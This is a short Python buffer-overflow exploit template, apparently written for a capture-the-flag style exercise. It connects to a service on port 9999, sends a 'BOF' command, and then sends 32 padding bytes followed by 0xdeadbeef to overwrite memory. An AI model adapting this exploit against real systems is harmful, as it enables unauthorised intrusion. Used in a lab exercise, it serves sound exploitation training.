#!/usr/bin/env python3
# BOF without pwntools - Can be used as a template

import socket
import struct

HOST = "127.0.0.1"    # Change to target IP
PORT = 9999

def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    
    # Read banner (up to prompt)
    data = b''
    while b'> ' not in data:
        data += s.recv(1024)
    print(data.decode(errors='ignore'))
    
    s.sendall(b'BOF\n')
    
    # Wait for buffer prompt
    data = b''
    while b'> ' not in data:
        data += s.recv(1024)
    print(data.decode(errors='ignore'))
    
    # Send the exploit payload: 32 'A's + 0xdeadbeef
    payload = b'A' * 32 + struct.pack('<I', 0xdeadbeef)
    s.sendall(payload + b'\n')
    
    # Receive the result
    result = s.recv(4096)
    print(result.decode(errors='ignore'))
    s.close()

if __name__ == "__main__":
    main()
